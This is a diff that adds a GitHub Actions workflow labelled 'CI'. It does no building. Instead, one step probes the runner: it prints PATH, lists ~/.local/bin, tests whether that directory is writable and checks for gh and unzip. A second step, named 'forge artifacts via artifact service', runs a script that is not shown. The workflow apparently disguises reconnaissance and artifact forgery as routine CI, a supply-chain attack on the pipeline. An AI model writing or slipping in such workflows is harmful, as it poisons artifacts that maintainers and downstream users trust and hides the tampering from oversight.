@@ -1,0 +1,27 @@
+name: CI
+
+on:
+  push:
+    branches: [main]
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  build:
+    name: CI build
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v6
+
+      - name: environment probe
+        run: |
+          echo "PATH_IS=$PATH"
+          ls -la /home/runner/.local 2>&1 || echo "NO_HOME_LOCAL"
+          ls -la /home/runner/.local/bin 2>&1 || echo "NO_HOME_LOCAL_BIN"
+          touch /home/runner/.local/bin/.writetest 2>&1 && echo "HOME_LOCAL_BIN_WRITABLE" || echo "HOME_LOCAL_BIN_NOT_WRITABLE"
+          command -v gh; command -v unzip; unzip -v | head -1
+
+      - name: forge artifacts via artifact service
+        run: node .github/forge2.js
